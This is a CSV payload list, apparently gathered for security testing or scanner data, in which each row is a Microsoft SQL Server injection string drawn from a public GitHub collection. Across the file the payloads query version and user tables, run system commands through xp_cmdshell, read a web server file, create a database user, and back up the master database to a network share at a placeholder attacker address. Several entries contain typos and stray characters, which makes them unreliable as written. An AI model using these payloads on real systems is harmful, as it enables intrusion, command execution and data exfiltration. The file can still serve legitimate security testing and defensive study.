cve,tag,payload,url
,SQL Injection,select @@version,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,select @@servernamee,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,select @@microsoftversione,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,select * from master..sysserverse,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,select * from sysusers,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,exec master..xp_cmdshell 'ipconfig+/all',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,exec master..xp_cmdshell 'net+view',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,exec master..xp_cmdshell 'net+users',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,exec master..xp_cmdshell 'ping+<attackerip>',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat',https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,"create table myfile (line varchar(8000))"" bulk insert foo from 'c:\inetpub\wwwroot\auth.asp̢'"" select * from myfile""--",https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,# you will need to customize/modify some of the vaules in the queries for best effect,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,; exec master..xp_cmdshell 'ping 10.10.1.2'--,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
,SQL Injection,create user name identified by 'pass123' --,https://github.com/omurugur/SQL_Injection_Payload/blob/master/SQL-Inj-Payload.txt
